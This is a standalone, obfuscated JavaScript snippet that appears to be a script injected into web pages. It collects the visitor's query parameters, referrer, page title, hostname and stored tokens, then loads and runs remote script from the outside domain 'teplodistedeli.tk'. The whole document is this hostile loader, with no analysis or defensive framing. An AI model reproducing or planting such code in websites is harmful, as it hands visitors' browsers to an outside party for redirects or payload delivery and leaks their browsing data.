 (function() {
    var name = '_qr8QpghMkksX2fHw';
    if (!window._qr8QpghMkksX2fHw) {
        window._qr8QpghMkksX2fHw = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://teplodistedeli.tk/fitshow',
            P_PATH: 'https://teplodistedeli.tk/fec84ce/postback',
        };
    }
    const _ZZj5xwmxRGk2XLtM = localStorage.getItem('config');
    if (typeof _ZZj5xwmxRGk2XLtM !== 'undefined' && _ZZj5xwmxRGk2XLtM !== null) {
        var _ysvTFVQsrwLTZ7w2 = JSON.parse(_ZZj5xwmxRGk2XLtM);
        var _JXwtk7cm1qGZSv6T = Math.round(+new Date()/1000);
        if (_ysvTFVQsrwLTZ7w2.created_at + window._qr8QpghMkksX2fHw.ttl < _JXwtk7cm1qGZSv6T) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _tMFYFxjdgzYPTHzx = localStorage.getItem('subId');
    var _z9ZT3GKQYDVcgS4L = localStorage.getItem('token');
    var _5RNQKJmSqhZXhx8B = '?return=js.client';
        _5RNQKJmSqhZXhx8B += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _5RNQKJmSqhZXhx8B += '&se_referrer=' + encodeURIComponent(document.referrer);
        _5RNQKJmSqhZXhx8B += '&default_keyword=' + encodeURIComponent(document.title);
        _5RNQKJmSqhZXhx8B += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _5RNQKJmSqhZXhx8B += '&name=' + encodeURIComponent(name);
        _5RNQKJmSqhZXhx8B += '&host=' + encodeURIComponent(window._qr8QpghMkksX2fHw.R_PATH);
    if (typeof _tMFYFxjdgzYPTHzx !== 'undefined' && _tMFYFxjdgzYPTHzx && window._qr8QpghMkksX2fHw.unique) {
        _5RNQKJmSqhZXhx8B += '&sub_id=' + encodeURIComponent(_tMFYFxjdgzYPTHzx);
    }
    if (typeof _z9ZT3GKQYDVcgS4L !== 'undefined' && _z9ZT3GKQYDVcgS4L && window._qr8QpghMkksX2fHw.unique) {
        _5RNQKJmSqhZXhx8B += '&token=' + encodeURIComponent(_z9ZT3GKQYDVcgS4L);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._qr8QpghMkksX2fHw.R_PATH + _5RNQKJmSqhZXhx8B;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
